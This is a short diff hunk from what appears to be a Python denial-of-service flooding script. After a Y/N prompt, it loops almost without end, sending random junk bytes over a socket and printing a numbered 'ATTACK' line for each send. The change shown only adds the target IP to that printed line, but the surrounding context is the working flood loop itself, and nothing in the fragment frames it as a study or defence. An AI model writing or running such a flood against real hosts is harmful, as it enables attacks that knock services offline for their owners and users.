@@ -37,7 +37,7 @@ if yn == 'Y':
     for i in range(1, 100 ** 1000):
         s.send(random._urandom(10) * 1000)
         na += 1
-        print(f"| ATTACK [{na}]")
+        print(f"{ip} | ATTACK [{na}]")
         time.sleep(sleep)
         
 elif yn =='N':
